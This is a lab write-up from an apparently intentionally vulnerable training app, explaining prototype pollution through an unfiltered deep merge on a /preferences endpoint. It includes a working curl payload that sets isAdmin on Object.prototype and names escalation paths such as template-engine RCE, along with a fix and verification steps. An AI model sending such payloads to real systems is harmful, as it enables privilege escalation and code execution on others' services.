# Lab 13: Prototype pollution via deep merge

`POST /preferences` merges user JSON into the session's preferences with a hand-rolled recursive merge. Keys are never filtered, so `__proto__` climbs the merge and writes onto `Object.prototype` — poisoning every object in the process.

**OWASP Top 10:2025:** [A08 Software or Data Integrity Failures](https://owasp.org/Top10/2025/)

**Code:** `routes/account.js` (`/preferences`), `model/merge.js`

## Exploit

```bash
curl -s -b cookies.txt -X POST http://localhost:8888/preferences \
  -H "Content-Type: application/json" \
  -d '{"__proto__":{"isAdmin":true}}'
# {"ok":true,"prefs":{}}
```

Confirm the poison inside the web process:

```bash
docker compose exec web node -e "
const { merge } = require('./model/merge');
merge({}, JSON.parse('{\"__proto__\":{\"pollutedFlag\":7}}'));
console.log(({}).pollutedFlag);   // 7  ← every new object inherits it
"
```

Why this is dangerous: any code that does `if (opts.isAdmin)`, `if (config.debug)`, or builds objects then reads missing keys can now take attacker-chosen branches. Classic escalation paths: auth-flag flips, template engine RCE (e.g. `ejs` `outputFunctionName`-style gadgets), denial of service via `Object.prototype` = huge values.

## Why it happens

`__proto__` is just a property name to `Object.keys()`, and assignment `target[key] = ...` follows the setter. The merge treats "source is a plain object" as recurse-worthy without asking *which* key is being written.

## Fix

Block the dangerous keys at every merge level:

```js
const BLOCKED = new Set(["__proto__", "constructor", "prototype"]);
function merge(target, source) {
  for (const key of Object.keys(source)) {
    if (BLOCKED.has(key)) continue;
    ...
  }
}
```

Or drop hand-rolled merges: use a maintained library with the guard built in, or validate the JSON against a schema (zod/ajv) before it touches internal objects. `Object.create(null)` for the preferences object also kills the chain.

## Verify

After the fix, the same payload returns `{"ok":true,"prefs":{"__proto__":...}}` (or rejects it), and `({}).isAdmin` stays `undefined` in the web process.